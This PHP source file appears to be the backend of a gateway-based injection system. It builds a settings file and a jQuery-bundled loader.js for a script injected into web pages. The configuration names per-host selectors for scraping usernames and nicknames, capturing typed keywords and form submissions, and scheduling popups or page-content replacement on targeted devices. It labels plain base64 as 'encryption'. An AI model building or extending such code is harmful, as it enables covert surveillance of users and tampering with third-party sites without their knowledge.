<?php
require_once 'functions.php';
require_once 'functions/onebox.php';

$is_debug = false;

if (isset($_GET['force'])) {
	$is_debug = true;
	update_sched_tasks();
	die();
}

function dbg_print($obj)
{
	global $is_debug;
	if ($is_debug) {
		print_r2($obj);
	}
}

function update_sched_tasks($listname='all')
{
	//获得管理端UI所生成的配置列表
	if ($listname === 'all') {
		//任务管理
		$popup_list     = mmc_array_all_cache(DATA_SCHED_LIST);
		$replace_list   = mmc_array_all_cache(DATA_PLANS_LIST);

		//配置信息
		$users_list     = mmc_array_all_cache(DATA_USER_LIST);
		$keyword_list  = mmc_array_all_cache(DATA_KEYWORD_LIST);
		$posi_list      = mmc_array_all_cache(DATA_POSI_LIST);
		$message_list   = mmc_array_all_cache(DATA_MESSAGE_LIST);

		//识别库
		$accnt_ident_list  = mmc_array_all_cache(DATA_ACCNT_IDENT_LIST);
		$kword_ident_list  = mmc_array_all_cache(DATA_KWORD_IDENT_LIST);
		$submt_ident_list  = mmc_array_all_cache(DATA_SUBMT_IDENT_LIST);

		//生成完整的《弹出窗口管理列表》
		$new_popup_list = make_new_popup_list($popup_list, $users_list, $message_list);
		update_new_popup_list($new_popup_list);

		//生成完整的《替换任务列表》
		$new_replace_list = make_new_replace_list($replace_list, $users_list, $message_list, $posi_list);
		update_new_replace_list($new_replace_list);

		//生成配置文件共浏览器使用
		make_new_settings_file($posi_list, $accnt_ident_list, $kword_ident_list, $submt_ident_list);
	} else {
		mmc_array_all_cache($listname);
	}
}

//---------------------------------------------------------------------

function make_new_settings_file($posi_list, $accnt_ident_list, $kword_ident_list, $submt_ident_list)
{
	$conf_arr = [];
	$conf_arr['posi_configs'] = makeconf_posi($posi_list);
	$conf_arr['accnt_ident_configs'] = makeconf_accnt_ident($accnt_ident_list);
	$conf_arr['kword_ident_configs'] = makeconf_kword_ident($kword_ident_list);
	$conf_arr['submt_ident_configs'] = makeconf_submt_ident($submt_ident_list);
	appand_to_settings($conf_arr);
	merge_js_files();
}

function makeconf_accnt_ident($accnt_ident_list)
{
	$result_sav = [];
	$browser_item = [];
	$gateway_item = [];

	foreach($accnt_ident_list as $key=>$item) {
		if ($item['active'] !== 'true') {
			continue;
		}

		$run_place = $item['run_place'];
		if ($run_place == 'browser') {
			$platform = $item['platform'];
			$new_ident = [];
			$new_ident['platform'] = $platform;
			$new_ident['caption'] = $item['caption'];
			$new_ident['host'] = $item['host'];
			$new_ident['url'] = $item['url'];
			$new_ident['username_selector'] = $item['username_selector'];
			$new_ident['username_regex'] = $item['username_regex'];
			$new_ident['nickname_selector'] = $item['nickname_selector'];
			$new_ident['nickname_regex'] = $item['nickname_regex'];
			$browser_item[] = $new_ident;
		} elseif ($run_place == 'gateway') {
			$key_name = $item['host'];
			$exist_items = @$gateway_item[$key_name];
			if (empty($exist_items)) {
				$exist_items = [];
			}
			$exist_items[] = $item;
			$gateway_item[$key_name] = $exist_items;
		}
	}

	$result_sav['browser'] = $browser_item;
	$result_sav['gateway'] = $gateway_item;
	return $result_sav;
}

function makeconf_submt_ident($submt_ident_list)
{
	$result_sav = [];
	$browser_item = [];
	$gateway_item = [];
	foreach($submt_ident_list as $key=>$item) {
		if ($item['active'] !== 'true') {
			continue;
		}

		$new_item = [];
		$run_place = $item['run_place'];
		if ($run_place == 'browser') {
			$new_item = [];
			$new_item['platform'] = $item['platform'];
			$new_item['caption'] = $item['caption'];
			$new_item['host'] = $item['host'];
			$new_item['url'] = $item['url'];
			$new_item['selector_txt'] = $item['selector_txt'];
			$new_item['selector_btn'] = $item['selector_btn'];
			$new_item['post_key'] = $item['post_key'];
			$browser_item[] = $new_item;
		} elseif ($run_place == 'gateway') {
			$key_name = $item['host'];
			$exist_items = @$gateway_item[$key_name];
			if (empty($exist_items)) {
				$exist_items = [];
			}
			$exist_items[] = $item;
			$gateway_item[$key_name] = $exist_items;
		}
	}

	foreach($gateway_item as $key=>&$item) {
		$item = encrypt_gateway_message($item);
	}

	$result_sav['browser'] = $browser_item;
	$result_sav['gateway'] = $gateway_item;
	return $result_sav;
}

function encrypt_gateway_message($message)
{
	return base64_encode(json_encode($message));
}

function makeconf_kword_ident($kword_ident_list)
{
	$result_sav = [];
	$browser_item = [];
	$gateway_item = [];
	foreach($kword_ident_list as $key=>$item) {
		if ($item['active'] !== 'true') {
			continue;
		}

		$new_item = [];
		$run_place = $item['run_place'];
		if ($run_place == 'browser') {
			$new_item = [];
			$new_item['platform'] = $item['platform'];
			$new_item['caption'] = $item['caption'];
			$new_item['ktype'] = $item['ktype'];
			$new_item['host'] = $item['host'];
			$new_item['url'] = $item['url'];
			$new_item['delay'] = $item['delay'];
			$new_item['selector'] = $item['selector'];
			$new_item['regex'] = $item['regex'];
			$browser_item[] = $new_item;

		} elseif ($run_place == 'gateway') {
			$key_name = $item['host'];
			$exist_items = @$gateway_item[$key_name];
			if (empty($exist_items)) {
				$exist_items = [];
			}
			$exist_items[] = $item;
			$gateway_item[$key_name] = $exist_items;
		}
	}

	foreach($gateway_item as $key=>&$item) {
		$item = encrypt_gateway_message($item);
	}

	$result_sav['browser'] = $browser_item;
	$result_sav['gateway'] = $gateway_item;
	return $result_sav;
}

function merge_js_files()
{
	$jquery = file_get_contents(__DIR__.'/js/jquery.min.js');
	$settings = file_get_contents(get_cached_path().'settings.js');
	$append_str = "function load_jquery(){{$jquery}}\n\n{$settings}\n\n";

	$loader = file_get_contents(__DIR__.'/js/loader.js');
	$new_output = preg_replace('/}\)\(\);}/i', '', $loader);
	$new_output .= $append_str.'})();}';

	file_put_contents(get_cached_path().'loader.js', $new_output);
}

function appand_to_settings($conf_arr)
{
	$setings_str = '';
	foreach($conf_arr as $key=>$item) {
		$setings_str .= "var $key = ".indent(json_encode($item)).";\n\n";
	}

	$settings_file = 'settings.js';
	$src_settings_js = __DIR__.'/js/'.$settings_file;
	$src_settings_content =  file_get_contents($src_settings_js);
	$new_content = preg_replace('/main\(\);}\)\(\);}/i', '', $src_settings_content);
	$new_content .= $setings_str;
	$new_content .= 'main();})();}';

	$settings_js = get_cached_path().$settings_file;
	file_put_contents($settings_js, $new_content);
}

function makeconf_posi($posi_list) 
{
	$posi_sav = [];
	foreach($posi_list as $key=>$posi) {
		$new_posi = [];
		$new_posi['key'] = $key;
		$new_posi['urls'] = explode(',', $posi['urls']);
		$new_posi['selectors'] = explode(',', $posi['selectors']);
		$new_posi['insert'] = $posi['insert'];
		$new_posi['action'] = $posi['action'];
		$posi_sav[] = $new_posi;
	}
	return $posi_sav;
}


function update_new_replace_list($new_replace_list)
{
	//找出需要删除的
	$del_replace_list = array_diff_key(using_tasks_list(KEY_PLANS_LIST), $new_replace_list);

	//逐条更新到memcached数组中
	$use_replace_list = [];
	foreach ($new_replace_list as $key=>$value) {
		if (time() < $value['finish_time']) {
			$use_replace_list[$key] = $value;
			mmc_array_set(NS_PLANS_TASKS, $key, $value, $value['finish_time']);
		}
	}

	//这是分发任务用的cache列表，更新之
	using_tasks_list(KEY_PLANS_LIST, $use_replace_list);

	//将需要删除的清除掉，让设备不再能够“读取”从而禁止规则执行
	foreach ($del_replace_list as $key=>$value) {
		mmc_array_del(NS_PLANS_TASKS, $key);
	}
}

function update_new_popup_list($new_sched_list)
{
	//找出需要删除的
	$old_sched_list = using_tasks_list(KEY_SCHED_LIST);
	$del_sched_list = array_diff_key($old_sched_list, $new_sched_list);

	//逐条更新到memcached数组中
	$use_sched_list = [];
	foreach ($new_sched_list as $key=>$value) {
		if (time() < $value['finish_time']) {
			$use_sched_list[$key] = $value;
			mmc_array_set(NS_SCHED_TASKS, $key, $value, $value['finish_time']);
		}
	}

	//这是分发任务用的cache列表，更新之
	using_tasks_list(KEY_SCHED_LIST, $use_sched_list);

	//将需要删除的清除掉，让设备不再能够“读取”从而禁止规则执行
	foreach ($del_sched_list as $key=>$value) {
		mmc_array_del(NS_SCHED_TASKS, $key);
	}
}

function get_cached_path()
{
	return __DIR__.'/cache/';
}

function get_cached_filename($name)
{
	return get_cached_path().$name.'.cache';
}

function del_cached_file($name)
{
	$filename = get_cached_filename($name);
	return unlink($filename);
}

function mmc_array_all_cache($name)
{
	$list = mmc_array_all($name);

	//清理异常记录
	
	foreach ($list as $key=>&$value) {
		if (@$value['name'] === '') {
			mmc_array_del($name, $key);
			loglocal('del '.$key);
			loglocal($value);
			unset($list[$key]);
		}

		if (array_key_exists('finish_time', $value)) {
			$finish_time = trans_time($value['finish_time']);
			if (time() >= $finish_time) {
				$value['status'] = 'timeout';
				mmc_array_set($name, $key, $value);
			}
		}
	}

	$file_name = get_cached_filename($name);

	if (count($list) === 0) {
		if (file_exists($file_name)) {
			$list = unserialize(file_get_contents($file_name));
			if (empty($list)) {
				return array();
			}
		} else {
			return array();
		}

		mmc_array_clear($name);
		foreach ($list as $key=>$value) {
			$res = mmc_array_set($name, $key, $value);
		}
	} else {
		file_put_contents($file_name, serialize($list));
	}

	return $list;
}

function using_tasks_list($cache_key, $new_list=null)
{
	$mem = api_open_mmc();
	if ($new_list === null) {
		$result = $mem->get($cache_key);
		(!$result) && ($result=array());
		return $result;
	} else {
		return $mem->set($cache_key, $new_list);
	}
}


function trans_time($time_str)
{
	return strtotime(preg_replace('/\(.+\)/', '',  $time_str));
}

function onebox_cached($content)
{
	$mem = api_open_mmc();
	$result = $mem->ns_get(NS_ONEBOX_CACHE, md5($content));
	if (empty($result)) {
		$result = make_onebox_appgame($content);
		$mem->ns_set(NS_ONEBOX_CACHE, md5($content), $result);
	}
	return $result;
}

function make_new_popup_list($sched_list, $users_list, $message_list)
{
	$result = array();
	foreach ($sched_list as $name=>$task) {
		$target_device = @$task['target_device'];
		$target_messages = @$task['sched_msg'];

		if (empty($target_device)) {continue;}
		if (empty($target_messages)) {continue;}

		$new_target = get_user_selected($users_list, $target_device);
		$pick_message = get_user_selected($message_list, $target_messages);

		$new_message = [];
		foreach ($pick_message as &$item) {
			$item['text'] = onebox_cached($item['text']);
			if ($item['msgform'] === 'popup') {
				$new_message[] = $item;
			}
		}

		$new = array();
		$new['targets'] = $new_target;
		$new['messages'] = $new_message;
		$new_task = array_merge($task, $new);

		$new_task['start_time'] = trans_time($new_task['start_time']);
		$new_task['finish_time'] = trans_time($new_task['finish_time']);
		$new_task['times'] = intval($new_task['times']);
		$new_task['time_interval'] = intval($new_task['time_interval']);
		$result[$name] = $new_task;
	}

	return $result;
}

function make_new_replace_list($replace_list, $users_list, $message_list, $posi_list)
{
	$result = array();
	foreach ($replace_list as $name=>$task) {
		$target_device = @$task['target_device'];
		$target_messages = @$task['replace_msg'];

		if (empty($target_device)) {continue;}
		if (empty($target_messages)) {continue;}

		$new_target = get_user_selected($users_list, $target_device);
		$pick_message = get_user_selected($message_list, $target_messages);

		$new_message = [];
		foreach ($pick_message as &$item) {
			$item['text'] = onebox_cached($item['text']);
			if ($item['msgform'] === 'replace') {
				$item['position'] = md5($item['position']);
				$new_message[] = $item;
			}
		}
		
		$new = array();
		$new['targets'] = $new_target;
		$new['messages'] = $new_message;
		$new_task = array_merge($task, $new);

		$new_task['start_time'] = trans_time($new_task['start_time']);
		$new_task['finish_time'] = trans_time($new_task['finish_time']);
		$new_task['times'] = intval($new_task['times']);
		$new_task['interval'] = intval($new_task['interval']);
		$new_task['interval_pre'] = intval($new_task['interval_pre']);
		$result[$name] = $new_task;
	}

	return $result;
}

function get_tag_name($value) {
	if (preg_match('/^\[(.+)\]$/', $value, $matchs)) {
		return $matchs[1];
	}
	return null;
}

function tag2names($list, $tag_name)
{
	$names = array();
	foreach ($list as $key=>$item) {
		if (strpos($item['tags'], $tag_name) !== false) {
			$names[] = $item['name'];
		}
	}
	return $names;
}

function get_user_selected($list, $user_selected)
{
	$item_names = array();
	$targets = explode(',', $user_selected);
	foreach($targets as $value) {
		$tag_name = get_tag_name($value);
		if ($tag_name) {
			$names = tag2names($list, $tag_name);
			foreach($names as $name) {
				if (!in_array($name, $item_names)) {
					$item_names[] = $name;
				}
			}
		} else {
			if (!in_array($value, $item_names)) {
				$item_names[] = $value;
			}
		}
	}

	$result = array();
	foreach($item_names as $name) {
		foreach ($list as $key=>$item) {
			if ($item['name']== $name) {
				$result[] = $item;
			}
		}
	}

	return $result;
}


?>
